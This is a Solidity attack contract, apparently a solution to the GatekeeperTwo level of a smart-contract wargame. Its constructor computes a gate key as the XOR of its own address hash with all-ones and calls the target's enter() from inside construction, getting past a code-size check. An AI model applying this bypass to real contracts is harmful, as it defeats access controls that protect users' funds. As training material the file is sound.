// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo public gatekeeperTwo;

    constructor(address _gatekeeperTwoAddress) public {
        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwoAddress);
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (uint64(0) - 1)
        );
        gatekeeperTwo.enter(gateKey);
    }
}
